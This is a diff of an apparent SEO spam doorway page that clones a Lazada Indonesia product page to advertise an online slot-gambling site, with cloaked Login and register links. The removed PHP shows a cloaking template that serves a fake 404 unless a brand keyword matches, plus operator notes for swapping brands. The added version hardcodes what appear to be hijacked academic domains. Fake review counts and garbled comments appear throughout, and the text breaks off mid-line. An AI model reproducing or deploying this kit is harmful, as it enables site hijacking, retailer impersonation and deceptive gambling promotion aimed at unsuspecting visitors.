@@ -1,79 +1,24 @@
-<?php
-
-function feedback404()
-{
-    header("HTTP/1.0 404 Not Found");
-    echo "<h1><strong>Ads</strong></h1>";
-    echo "Tacoloco Here!";
-}
-
-if (isset($_GET['here'])) {
-    $filename = "coba.txt";
-    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    $target_string = strtolower($_GET['here']);
-    foreach ($lines as $item) {
-        if (strtolower($item) === $target_string) {
-            $BRAND = strtoupper($target_string);
-        }
-    }
-    if (isset($BRAND)) {
-        $BRANDS = $BRAND;
-        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
-        $fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
-        if (isset($fullUrl)) {
-            $parsedUrl = parse_url($fullUrl);
-            $scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
-            $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
-            $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
-            $query = isset($parsedUrl['query']) ? $parsedUrl['query'] : '';
-            $baseUrl = $scheme . "://" . $host . $path . '?' . $query;
-            $urlPath = $baseUrl;
-        } else {
-            echo "URL saat ini tidak didefinisikan.";
-        }
-    } else {
-        feedback404();
-        exit();
-    }
-} else {
-    feedback404();
-    exit();
-}
-
-/*
-
-*GANTI NAMA BRAND DENGAN INI
-<?php echo $BRANDS ?> 
-
-* GANTI URL PATH DENGAN INI
-<?php echo $urlPath ?>
-
-* SAMA GANTI REDIRECT LOGIN/REGISTER
-
-*/
-
-?>
-<!DOCTYPE HTML>
 <html xmlns:wormhole="http://www.w3.org/1999/xhtml" lang="id-ID">
 <head>
   <meta charset="utf-8"/>
-  <title><?php echo $BRANDS ?> 💸 PENGHASIL CUAN EXTRA DENGAN MODAL CEBAN</title>
-  <meta name="description" content="<?php echo $BRANDS ?> menghadirkan permainan slot yang dirancang khusus untuk memberikan pengalaman bermain yang menguntungkan dengan modal terjangkau bagi para member yang baru saja daftar."/>
+  <title>BOLAHIT : Link Situs Slot Gacor Hari Ini dan Bonus Daftar Slot Demo 100%</title>
+  <meta name="description" content="BOLAHIT merupakan link situs slot gacor hari ini dengan fitur promo bonus daftar slot demo hingga 100% untuk para pecinta slot online di Indonesia."/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
   <meta name="aplus-auto-exp" content='[{"filter":"exp-tracking=suggest-official-store","logkey":"/lzdse.result.os_impr","props":["href"],"tag":"a"}]'/>
-  <meta name="data-spm" content="<?php echo $BRANDS ?>"/>
+  <meta name="data-spm" content="Slot Gacor"/>
   <meta name="robots" content="index, follow"/>
-  <meta name="og:url" content="<?php echo $urlPath ?>"/>
-  <meta name="og:title" content="<?php echo $BRANDS ?> 💸 PENGHASIL CUAN EXTRA DENGAN MODAL CEBAN"/>
+  <meta name="og:url" content="https://www.agraria1alvear.edu.ar"/>
+  <meta name="og:title" content="BOLAHIT : Link Situs Slot Gacor Hari Ini dan Bonus Daftar Slot Demo 100%"/>
   <meta name="og:type" content="product"/>
-  <meta name="og:description" content="<?php echo $BRANDS ?> menghadirkan permainan slot yang dirancang khusus untuk memberikan pengalaman bermain yang menguntungkan dengan modal terjangkau bagi para member yang baru saja daftar."/>
-  <meta name="og:image" content="https://i.postimg.cc/RVmhPnH1/adsslot.jpg"/>
+  <meta name="og:description" content="BOLAHIT merupakan link situs slot gacor hari ini dengan fitur promo bonus daftar slot demo hingga 100% untuk para pecinta slot online di Indonesia."/>
+  <meta name="og:image" content="https://goodimg.io/images/2024/07/07/situs-slot-gacor-bolahit.jpg"/>
   <link rel="manifest" href="https://g.lazcdn.com/g/lzdfe/pwa-assets/5.0.7/manifest/id.json">
-  <link rel="shortcut icon" href="https://cdn-icons-png.flaticon.com/512/8616/8616976.png"/>
-  <link rel="canonical" href="<?php echo $urlPath ?>"/>
-  <link rel="amphtml" href="https://cetproorthuanuco.edu.pe/ads/amp/"/>
+  <link rel="shortcut icon" href="https://goodimg.io/images/2024/06/30/favicon-bolahit.png"/>
+  <link rel="canonical" href="https://www.agraria1alvear.edu.ar"/>
+  <link rel="amphtml" href="https://koi.avatar-amp.info/www.agraria1alvear.edu.ar/"/>
+  <meta name="google-site-verification" content="3Yqt47r8sYCbWUA5n9EdZof7sAGW4A8M3jR4FQLc0fc" />
   <!-- start preload -->
-  <link rel="preload" href="https://i.postimg.cc/RVmhPnH1/adsslot.jpg" as="image"/>
+  <link rel="preload" href="https://goodimg.io/images/2024/07/07/situs-slot-gacor-bolahit.jpg" as="image"/>
   <link rel="preconnect dns-prefetch" href="//cart.lazada.co.id"/>
   <link rel="preconnect dns-prefetch" href="//acs-m.lazada.co.id"/>
   <link rel="preconnect dns-prefetch" href="//laz-g-cdn.alicdn.com"/>
@@ -151,7 +96,7 @@ if (isset($_GET['here'])) {
         'action':'aplus.appendMetaInfo',
         'arguments':['aplus-exdata',{"st_page_id":pageid}]
       });
-      // 兼容老版本aplus
+      // å…¼å®¹è€ç‰ˆæœ¬aplus
       var gq = (window.goldlog_queue || (window.goldlog_queue = []));
       gq.push({
         'action':'goldlog.appendMetaInfo',
@@ -173,7 +118,7 @@ if (isset($_GET['here'])) {
       start: Date.now(),
     };
     var dataLayer = window.dataLayer || [];
-    var pdpTrackingData = "{\"pdt_category\":[\"<?php echo $BRANDS ?>\"],\"pagetype\":\"pdp\",\"pdt_discount\":\"\",\"pdt_photo\":\"//i.imgur.com/D9ELtgR.jpeg\",\"v_voya\":1,\"brand_name\":\"<?php echo $BRANDS ?>\",\"brand_id\":\"842\",\"pdt_sku\":3642482616,\"core\":{\"country\":\"ID\",\"layoutType\":\"desktop\",\"language\":\"in\",\"currencyCode\":\"IDR\"},\"seller_name\":\"\",\"pdt_simplesku\":6108584955,\"pdt_name\":\"<?php echo $BRANDS ?> 💸 PENGHASIL CUAN EXTRA DENGAN MODAL CEBAN\",\"page\":{\"regCategoryId\":\"300300002584\",\"xParams\":\"_p_typ=pdp&_p_ispdp=1&_p_item=3642482616_ID-6108584955&_p_prod=3642482616&_p_sku=6108584955&_p_slr=\"},\"supplier_id\":\"\",\"pdt_price\":\"Rp2.699.000\"}";
+    var pdpTrackingData = "{\"pdt_category\":[\"Slot Gacor\"],\"pagetype\":\"pdp\",\"pdt_discount\":\"\",\"pdt_photo\":\"//goodimg.io/images/2024/07/07/situs-slot-gacor-bolahit.jpg\",\"v_voya\":1,\"brand_name\":\"Slot Gacor\",\"brand_id\":\"842\",\"pdt_sku\":3642482616,\"core\":{\"country\":\"ID\",\"layoutType\":\"desktop\",\"language\":\"in\",\"currencyCode\":\"IDR\"},\"seller_name\":\"\",\"pdt_simplesku\":6108584955,\"pdt_name\":\"BOLAHIT : Link Situs Slot Gacor Hari Ini dan Bonus Daftar Slot Demo 100%\",\"page\":{\"regCategoryId\":\"300300002584\",\"xParams\":\"_p_typ=pdp&_p_ispdp=1&_p_item=3642482616_ID-6108584955&_p_prod=3642482616&_p_sku=6108584955&_p_slr=\"},\"supplier_id\":\"\",\"pdt_price\":\"Rp2.699.000\"}";
     try {
       pdpTrackingData = JSON.parse(pdpTrackingData);
       pdpTrackingData.v_voya = false;
@@ -188,7 +133,7 @@ if (isset($_GET['here'])) {
       }
     }
     /**
-     * 支持beacon aplus script
+     * æ”¯æŒbeacon aplus script
      */
     var siteNameForApluPluginLoader = "Lazada";
 
@@ -540,7 +485,7 @@ if (isset($_GET['here'])) {
 </div>
 
   <script type="application/ld+json">
-    {"@type":"Product","@context":"https://schema.org","name":"<?php echo $BRANDS ?> 💸 PENGHASIL CUAN EXTRA DENGAN MODAL CEBAN","image":"//i.imgur.com/D9ELtgR.jpeg","category":"<?php echo $BRANDS ?>","brand":{"@type":"Brand","name":"<?php echo $BRANDS ?>","url":"<?php echo $urlPath ?>"},"sku":"3642482616_ID-6108584955","mpn":3642482616,"description":"<?php echo $BRANDS ?> menghadirkan permainan slot yang dirancang khusus untuk memberikan pengalaman bermain yang menguntungkan dengan modal terjangkau bagi para member yang baru saja daftar.","url":"https://www.lazada.co.id/products/samsung-t4001-32-inch-digital-led-tv-ua32t4001akxxd-i3642482616-s6108584955.html","offers":{"@type":"Offer","url":"https://www.lazada.co.id/products/samsung-t4001-32-inch-digital-led-tv-ua32t4001akxxd-i3642482616-s6108584955.html","seller":{"@type":"Organization","name":""},"priceCurrency":"IDR","price":0,"availability":"https://schema.org/InStock","itemCondition":"https://schema.org/NewCondition"}}
+    {"@type":"Product","@context":"https://schema.org","name":"BOLAHIT : Link Situs Slot Gacor Hari Ini dan Bonus Daftar Slot Demo 100%","image":"//goodimg.io/images/2024/07/07/situs-slot-gacor-bolahit.jpg","category":"Slot Gacor","brand":{"@type":"Brand","name":"Slot Gacor","url":"https://www.agraria1alvear.edu.ar"},"sku":"3642482616_ID-6108584955","mpn":3642482616,"description":"BOLAHIT merupakan link situs slot gacor hari ini dengan fitur promo bonus daftar slot demo hingga 100% untuk para pecinta slot online di Indonesia.","url":"https://www.lazada.co.id/products/samsung-t4001-32-inch-digital-led-tv-ua32t4001akxxd-i3642482616-s6108584955.html","offers":{"@type":"Offer","url":"https://www.lazada.co.id/products/samsung-t4001-32-inch-digital-led-tv-ua32t4001akxxd-i3642482616-s6108584955.html","seller":{"@type":"Organization","name":""},"priceCurrency":"IDR","price":0,"availability":"https://schema.org/InStock","itemCondition":"https://schema.org/NewCondition"}}
   </script>
   <script type="application/ld+json" data-rh="true">
       {
@@ -550,36 +495,36 @@ if (isset($_GET['here'])) {
           "@type": "ListItem",
           "position": 1,
           "item": {
-            "@id": "<?php echo $urlPath ?>",
-            "name": "<?php echo $BRANDS ?> 💸 PENGHASIL CUAN EXTRA DENGAN MODAL CEBAN"
+            "@id": "https://www.agraria1alvear.edu.ar",
+            "name": "Slot"
           }
         }, {
           "@type": "ListItem",
           "position": 2,
           "item": {
-            "@id": "<?php echo $urlPath ?>",
-            "name": "<?php echo $BRANDS ?> 💸 PENGHASIL CUAN EXTRA DENGAN MODAL CEBAN"
+            "@id": "https://www.agraria1alvear.edu.ar",
+            "name": "Slot Gacor"
           }
         }, {
           "@type": "ListItem",
           "position": 3,
           "item": {
-            "@id": "<?php echo $urlPath ?>",
-            "name": "<?php echo $BRANDS ?> 💸 PENGHASIL CUAN EXTRA DENGAN MODAL CEBAN"
+            "@id": "https://www.agraria1alvear.edu.ar",
+            "name": "Situs SLot Gacor"
           }
         }, {
           "@type": "ListItem",
           "position": 4,
           "item": {
-            "@id": "<?php echo $urlPath ?>",
-            "name": "<?php echo $BRANDS ?> 💸 PENGHASIL CUAN EXTRA DENGAN MODAL CEBAN"
+            "@id": "https://www.agraria1alvear.edu.ar",
+            "name": "Slot Gacor Hari Ini"
           }
         }, {
           "@type": "ListItem",
           "position": 5,
           "item": {
-            "@id": "<?php echo $urlPath ?>",
-            "name": "<?php echo $BRANDS ?> 💸 PENGHASIL CUAN EXTRA DENGAN MODAL CEBAN"
+            "@id": "https://www.agraria1alvear.edu.ar",
+            "name": "BOLAHIT : Link Situs Slot Gacor Hari Ini dan Bonus Daftar Slot Demo 100%"
           }
         }]
       }
@@ -646,7 +591,7 @@ if (isset($_GET['here'])) {
       'action':'aplus.appendMetaInfo',
       'arguments':['aplus-exdata',{"st_page_id":pageid}]
     });
-    // 兼容老版本aplus
+    // å…¼å®¹è€ç‰ˆæœ¬aplus
     var gq = (window.goldlog_queue || (window.goldlog_queue = []));
     gq.push({
       'action':'goldlog.appendMetaInfo',
@@ -681,10 +626,10 @@ if (isset($_GET['here'])) {
                     <a class="highlight" target="_blank" href="//yida.alibaba-inc.com/alibaba/web/APP_NZEYXSPGPBMKO7Z1LCE5/inst/homepage/?spm=a2o42.home.header.d0.654346b5QeptXc#/" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d0">INTERNAL FEEDBACK</a>
                 </div>
                   <div class="top-links-item" id="topActionFeedback">
-                      <a class="highlight" target="_blank" href="//pages.lazada.co.id/wow/gcp/route/lazada/id/upr_1000345_lazada/channel/id/upr-router/id_upr?hybrid=1&amp;data_prefetch=true&amp;prefetch_replace=1&amp;at_iframe=1&amp;wh_pid=/lazada/channel/id/trade/feedback" data-spm-click="gostr=/lzdpub.header.tbar;locaid=dfeedback">Masukan</a>
+                      <a class="highlight" target="_blank" href="//pages.lazada.co.id/wow/gcp/route/lazada/id/upr_1000345_lazada/channel/id/upr-router/id_upr?hybrid=1&amp;data_prefetch=true&amp;prefetch_replace=1&amp;at_iframe=1&amp;wh_pid=/lazada/channel/id/trade/feedback" data-spm-click="gostr=/lzdpub.header.tbar;locaid=dfeedback">SLOT</a>
                   </div>
                     <div class="top-links-item orange" id="topActionDownload" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d1">
-                        <span>LEBIH MURAH DI APP</span>
+                        <span>SLOT GACOR</span>
                         <div class="lzd-download-popup top-popup-wrap" id="lzdDownloadPopup">
   <div class="top-popup-content lzd-download-content">
     <div class="get-the-app-scope">
@@ -703,7 +648,7 @@ new XMLHttpRequest;else if(window.ActiveXObject)try{f=new ActiveXObject("Msxml2.
 function B(){var b={},c;c=document.getElementsByTagName("IMG");if(!c.length)return{};var a=c[0];if(!("naturalWidth"in a&&"naturalHeight"in a))return{};for(var d=0;a=c[d];++d){var e=a.getAttribute("data-pagespeed-url-hash");e&&(!(e in b)&&0<a.width&&0<a.height&&0<a.naturalWidth&&0<a.naturalHeight||e in b&&a.width>=b[e].o&&a.height>=b[e].m)&&(b[e]={rw:a.width,rh:a.height,ow:a.naturalWidth,oh:a.naturalHeight})}return b}var C="";u("pagespeed.CriticalImages.getBeaconData",function(){return C});
 u("pagespeed.CriticalImages.Run",function(b,c,a,d,e,f){var r=new y(b,c,a,e,f);x=r;d&&w(function(){window.setTimeout(function(){A(r)},0)})});})();
 
-pagespeed.CriticalImages.Run('/mod_pagespeed_beacon','<?php echo $urlPath ?>','Tt5XTryosv',true,false,'dJJOea8Af3s');
+pagespeed.CriticalImages.Run('/mod_pagespeed_beacon','https://www.agraria1alvear.edu.ar','Tt5XTryosv',true,false,'dJJOea8Af3s');
 //]]></script><img class="get-the-app-lazada-qr" src="//laz-img-cdn.alicdn.com/images/ims-web/TB1b43RtrvpK1RjSZFqXXcXUVXa.png" alt="" data-pagespeed-url-hash="1813935101" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
             </div>
           <div class="promotion-text">
@@ -744,10 +689,10 @@ pagespeed.CriticalImages.Run('/mod_pagespeed_beacon','<?php echo $urlPath ?>','T
 </div>
                     </div>
                 <div class="top-links-item" id="topActionSell">
-                    <a class="cyan" href="//pages.lazada.co.id/wow/i/id/sell-on-lazada/jualanonline" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d2">MENJADI SELLER</a>
+                    <a class="cyan" href="//pages.lazada.co.id/wow/i/id/sell-on-lazada/jualanonline" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d2">SITUS SLOT GACOR</a>
                 </div>
                     <div class="top-links-item" id="topActionCustomCare" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d3">
-                      <span>customer care</span>
+                      <span>SLOT GACOR HARI INI</span>
                         <div class="lzd-customcare-popup top-popup-wrap">
   <div class="top-popup-content l-customcare-content">
     <ul class="care-list">
@@ -798,7 +743,7 @@ pagespeed.CriticalImages.Run('/mod_pagespeed_beacon','<?php echo $urlPath ?>','T
 </div>
                     </div>
                   <div class="top-links-item grey" id="topActionTrack" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d4">
-                    <span>LACAK PESANAN</span>
+                    <span>BOLAHIT</span>
                     <div class="lzd-track-popup top-popup-wrap" id="lzdTrackPop">
   <div class="top-popup-content lzd-track-content">
     <div id="topActionMyLastOrder">
@@ -819,10 +764,10 @@ pagespeed.CriticalImages.Run('/mod_pagespeed_beacon','<?php echo $urlPath ?>','T
 </div>
                   </div>
                 <div class="top-links-item  grey" id="anonLogin">
-                  <a class="grey" href="https://cetproorthuanuco.edu.pe/ads/amp/" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d5">LOGIN</a>
+                  <a class="grey" href="https://mikale.me/dmeSw3" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d5">LOGIN</a>
                 </div>
                 <div class="top-links-item  grey" id="anonSignup">
-                  <a class="grey" href="https://cetproorthuanuco.edu.pe/ads/amp/" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d6">DAFTAR</a>
+                  <a class="grey" href="https://mikale.me/bolahitya" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d6">DAFTAR</a>
                 </div>
                 <div class="top-links-item top-links-item-hidden" id="topActionUserAccont" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d7">
                   <span id="myAccountTrigger" class="grey"></span>
@@ -876,7 +821,7 @@ pagespeed.CriticalImages.Run('/mod_pagespeed_beacon','<?php echo $urlPath ?>','T
 <div class="lzd-site-nav-menu lzd-site-nav-menu-active" data-mod-name="@ali/lzdmod-site-menu-nav-pc/pc/index" data-config="{}">
     <div class="lzd-site-menu-nav-container">
         <div class="lzd-site-menu-nav-category">
-            <a href="<?php echo $urlPath ?>">
+            <a href="https://www.agraria1alvear.edu.ar">
                 <span class="lzd-site-menu-nav-category-text">Kategori</span>
             </a>
             <div class="lzd-site-menu-nav-menu">
@@ -1957,7 +1902,7 @@ pagespeed.CriticalImages.Run('/mod_pagespeed_beacon','<?php echo $urlPath ?>','T
 <div class="lzd-site-nav-menu lzd-site-nav-menu-active" data-mod-name="@ali/lzdmod-site-menu-nav-pc/pc/index" data-config="{}">
     <div class="lzd-site-menu-nav-container">
         <div class="lzd-site-menu-nav-category">
-            <a href="<?php echo $urlPath ?>">
+            <a href="https://www.agraria1alvear.edu.ar">
                 <span class="lzd-site-menu-nav-category-text">Kategori</span>
             </a>
             <div class="lzd-site-menu-nav-menu">
@@ -2999,21 +2944,21 @@ pagespeed.CriticalImages.Run('/mod_pagespeed_beacon','<?php echo $urlPath ?>','T
                 <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon lazada-ic-channel-LazMall">&#xe629;</i>-->
                 <span class="lzd-menu-labels-item-text">LazMall</span>
             </a>
-            <a class="lzd-menu-labels-item" href="<?php echo $urlPath ?>">
+            <a class="lzd-menu-labels-item" href="https://www.agraria1alvear.edu.ar">
                 <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                     <img alt="Pulsa &amp;" class="lzd-site-nav-menu-iconfont-img" src="//laz-img-cdn.alicdn.com/images/ims-web/TB1Je4vhRr0gK0jSZFnXXbRRXXa.png" data-pagespeed-url-hash="611565874" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
                 </span>
                 <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon lazada-ic-channel-MobileTop1">&#xe768;</i>-->
                         <span class="lzd-menu-labels-item-text">Pulsa &amp; Tagihan</span>
             </a>
-            <a class="lzd-menu-labels-item" href="<?php echo $urlPath ?>">
+            <a class="lzd-menu-labels-item" href="https://www.agraria1alvear.edu.ar">
                 <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                     <img alt="Voucher &amp;" class="lzd-site-nav-menu-iconfont-img" src="//laz-img-cdn.alicdn.com/images/ims-web/TB1x8lvhHj1gK0jSZFuXXcrHpXa.png" data-pagespeed-url-hash="4146563714" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
                 </span>
                 <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon lazada-ic-channel-Vouchers">&#xe76a;</i>-->
                         <span class="lzd-menu-labels-item-text">Voucher &amp; Diskon</span>
             </a>
-            <a class="lzd-menu-labels-item" href="<?php echo $urlPath ?>">
+            <a class="lzd-menu-labels-item" href="https://www.agraria1alvear.edu.ar">
                 <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                     <img alt="LazBlog" class="lzd-site-nav-menu-iconfont-img" src="//icms-image.slatic.net/images/ims-web/9174453f-455e-4e30-87d2-bd90239e6994.png" data-pagespeed-url-hash="410448523" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
                 </span>
@@ -3209,7 +3154,17 @@ if (!lzdDocCookies.getItem('t_uid')) {
 
   </div>
   <div id="container" style="visibility: visible;">
-    <div id="root" class="pdp-block" data-reactroot=""><div id="module_core" class="pdp-block module"><p></p></div><div id="block-r3bZB9J63C" class="pdp-block pdp-block_group_buy_tip"><div id="module_group_buy_tip" class="pdp-block module"></div></div><div id="block-9uUVSSMxTb" class="pdp-block pdp-block__main-information"><div id="block-W59OjAyxSy" class="pdp-block pdp-block__gallery"><div id="module_item_gallery_1" class="pdp-block module"><div class="item-gallery" data-spm="gallery"><div class="gallery-preview-panel"><div class="gallery-preview-panel__content"><img class="pdp-mod-common-image gallery-preview-panel__image" alt="<?php echo $BRANDS ?> 💸 PENGHASIL CUAN EXTRA DENGAN MODAL CEBAN" src="https://i.postimg.cc/RVmhPnH1/adsslot.jpg" data-pagespeed-url-hash="3158714108" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/></div></div><div class="next-slick next-slick-outer next-slick-horizontal item-gallery-slider"><div class="next-slick-inner next-slick-initialized" draggable="true"><div class="next-slick-list"><div class="next-slick-track"><div style="outline:none;width:52px" class="next-slick-slide next-slick-active next-slick-cloned item-gallery__thumbnail item-gallery__thumbnail_state_active" lazada_pdp_gallery_tpp_track="gallery" main_image_number="1" data-index="0" tabindex="-1"><div class="item-gallery__image-wrapper"></div></div></div></div><div data-role="none" class="next-slick-arrow next-slick-prev outer medium horizontal disabled" style="display:block"><i class="next-icon next-icon-arrow-left next-icon-medium"></i></div><div data-role="none" class="next-slick-arrow next-slick-next outer medium horizontal disabled" style="display:block"><i class="next-icon next-icon-arrow-right next-icon-medium"></i></div></div></div></div></div></div><div id="block-n8THsmEaVS" class="pdp-block pdp-block__main-information-detail"><div id="block-6QhDn4z1db" class="pdp-block"><div id="block-ssuYrXSucaM" class="pdp-block pdp-block__product-detail"><div id="module_flash_sale" class="pdp-block module"></div><div id="module_crazy_deal" class="pdp-block module"></div><div id="module_redmart_top_promo_banner" class="pdp-block module"></div><div id="module_product_title_1" class="pdp-block module"><div class="pdp-product-title"><div class="pdp-mod-product-badge-wrapper"><h1 class="pdp-mod-product-badge-title"><?php echo $BRANDS ?> 💸 PENGHASIL CUAN EXTRA DENGAN MODAL CEBAN</h1></div></div></div><div id="module_pre-order-tag" class="pdp-block module"></div><div id="block-C7wdxsrWYA0" class="pdp-block pdp-block__rating-questions-summary"><div id="block-qkzkCPtx4vZ" class="pdp-block pdp-block__rating-questions"><div id="module_product_review_star_1" class="pdp-block module"><div class="pdp-review-summary"><div class="container-star pdp-review-summary__stars pdp-stars_size_s"><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png" data-pagespeed-url-hash="3678877346" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png" data-pagespeed-url-hash="3678877346" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png" data-pagespeed-url-hash="3678877346" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png" data-pagespeed-url-hash="3678877346" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png" data-pagespeed-url-hash="3678877346" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/></div><a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-review-summary__link" data-spm-anchor-id="a2o4j.pdp_revamp.0.0">8.900.932 Penilaian</a></div></div></div><div id="block-ztlO6gvyRIv" class="pdp-block pdp-block__share"><div id="block--PRjoF98du4" class="pdp-block" style="display:inline-block;width:24px;height:54px"><div id="module_product_share_1" class="pdp-block module"></div></div><div id="block-7fC8S_Z8DDj" class="pdp-block" style="display:inline-block"><div id="module_product_wishlist_1" class="pdp-block module"><p></p></div></div></div></div><div id="module_product_brand_1" class="pdp-block module"><div class="pdp-product-brand"><span class="pdp-product-brand__name">Merek<!-- -->:<!-- --> </span><a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-product-brand__brand-link" target="_self" href="<?php echo $urlPath ?>"><?php echo $BRANDS ?></a><div class="pdp-product-brand__divider"></div></div></div><div id="module_product_attrs" class="pdp-block module"></div><div id="block-cKVxLtoIbl2" class="pdp-block module"></div><div id="module_product_price_1" class="pdp-block module"><div class="pdp-mod-product-price"><p><?php echo $BRANDS ?> menghadirkan permainan slot yang dirancang khusus untuk memberikan pengalaman bermain yang menguntungkan dengan modal terjangkau bagi para member yang baru saja daftar.</p><div class="pdp-product-price" bis_skin_checked="1"><span class="notranslate pdp-price pdp-price_type_normal pdp-price_color_orange pdp-price_size_xl" data-spm-anchor-id="a2o4j.pdp_revamp.0.i0.241073bdUG5ius">Rp.10.000</span><div class="origin-block" bis_skin_checked="1"><span class="notranslate pdp-price pdp-price_type_deleted pdp-price_color_lightgray pdp-price_size_xs">Rp.100.000</span><span class="pdp-product-price__discount">-90%</span></div></div></div></div><div id="module_redmart_product_price" class="pdp-block module"></div><div id="module_promotion_tags" class="pdp-block module"></div><div id="module_installment" class="pdp-block module"></div><div id="module_quantity-input" class="pdp-block module"><div class="pdp-mod-product-info-section sku-quantity-selection" bis_skin_checked="1"><h6 class="section-title">Kuantitas</h6><div class="section-content" bis_skin_checked="1"><div class="next-number-picker next-number-picker-inline" bis_skin_checked="1"><div class="next-number-picker-handler-wrap" bis_skin_checked="1"><a unselectable="unselectable" class="next-number-picker-handler next-number-picker-handler-up "><span unselectable="unselectable" class="next-number-picker-handler-up-inner"><i class="next-icon next-icon-add next-icon-medium"></i></span></a><a unselectable="unselectable" class="next-number-picker-handler next-number-picker-handler-down next-number-picker-handler-down-disabled"><span unselectable="unselectable" class="next-number-picker-handler-down-inner"><i class="next-icon next-icon-minus next-icon-medium"></i></span></a></div><div class="next-number-picker-input-wrap" bis_skin_checked="1"><span class="next-input next-input-single next-input-medium next-number-picker-input"><input min="1" max="5" step="1" autocomplete="off" type="text" height="100%" value="1"></span></div></div><span class="quantity-content-default"></span></div></div></div><div id="module_sms-phone-input" class="pdp-block module"></div><div id="module_add_to_cart" class="pdp-block module" bis_skin_checked="1"><div class="pdp-cart-concern" bis_skin_checked="1"><a href="https://cetproorthuanuco.edu.pe/ads/amp/"><button class="add-to-cart-buy-now-btn  pdp-button pdp-button_type_text pdp-button_theme_yellow pdp-button_size_xl" data-spm-anchor-id="a2o4j.pdp_revamp.0.i0.241073bdeHYO5j"><span class="pdp-button-text">Login</span></button></a><a href="https://cetproorthuanuco.edu.pe/ads/amp/" target="_blank"><button class="add-to-cart-buy-now-btn  pdp-button pdp-button_type_text pdp-button_theme_orange pdp-button_size_xl"><span class="pdp-button-text"><span class="">DAFTAR SEKARANG</span></span></button></a><form method="post" action=""><input name="buyParams" type="hidden" value="{&quot;items&quot;:[{&quot;itemId&quot;:&quot;3642482616&quot;,&quot;skuId&quot;:&quot;6108584955&quot;,&quot;quantity&quot;:1,&quot;attributes&quot;:null}]}"></form></div></div><div id="module_redmart_add_to_cart" class="pdp-block module"></div></div><div id="block-O-HF3LN4YVI" class="pdp-block pdp-block__delivery-seller"><div id="module_seller_delivery" class="pdp-block module"><div data-spm="delivery_options" data-nosnippet="true"></div></div><div id="module_redmart_delivery" class="pdp-block module"></div><div id="module_seller_warranty" class="pdp-block module"></div><div id="module_guide_app" class="pdp-block module"></div><div id="module_redmart_service" class="pdp-block module"></div><div id="module_seller_info" class="pdp-block module"><div class="seller-container" data-spm="seller"><div class="seller-name"><div class="seller-name__wrapper"><div class="seller-name__title">Dijual oleh</div><div class="seller-name__detail" data-spm="seller"><a class="pdp-link pdp-link_size_l pdp-link_theme_black seller-name__detail-name"></a></div></div></div><div class="pdp-seller-info-pc"></div></div></div><div id="module_redmart_seller_info" class="pdp-block module"></div></div></div></div></div></div>
+    <div id="root" class="pdp-block" data-reactroot=""><div id="module_core" class="pdp-block module"><p></p></div><div id="block-r3bZB9J63C" class="pdp-block pdp-block_group_buy_tip"><div id="module_group_buy_tip" class="pdp-block module"></div></div><div id="block-9uUVSSMxTb" class="pdp-block pdp-block__main-information"><div id="block-W59OjAyxSy" class="pdp-block pdp-block__gallery"><div id="module_item_gallery_1" class="pdp-block module"><div class="item-gallery" data-spm="gallery"><div class="gallery-preview-panel"><div class="gallery-preview-panel__content"><img class="pdp-mod-common-image gallery-preview-panel__image" alt="BOLAHIT : Link Situs Slot Gacor Hari Ini dan Bonus Daftar Slot Demo 100%" src="https://goodimg.io/images/2024/07/07/situs-slot-gacor-bolahit.jpg" data-pagespeed-url-hash="3158714108" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/></div></div><div class="next-slick next-slick-outer next-slick-horizontal item-gallery-slider"><div class="next-slick-inner next-slick-initialized" draggable="true"><div class="next-slick-list"><div class="next-slick-track"><div style="outline:none;width:52px" class="next-slick-slide next-slick-active next-slick-cloned item-gallery__thumbnail item-gallery__thumbnail_state_active" lazada_pdp_gallery_tpp_track="gallery" main_image_number="1" data-index="0" tabindex="-1"><div class="item-gallery__image-wrapper"></div></div></div></div><div data-role="none" class="next-slick-arrow next-slick-prev outer medium horizontal disabled" style="display:block"><i class="next-icon next-icon-arrow-left next-icon-medium"></i></div><div data-role="none" class="next-slick-arrow next-slick-next outer medium horizontal disabled" style="display:block"><i class="next-icon next-icon-arrow-right 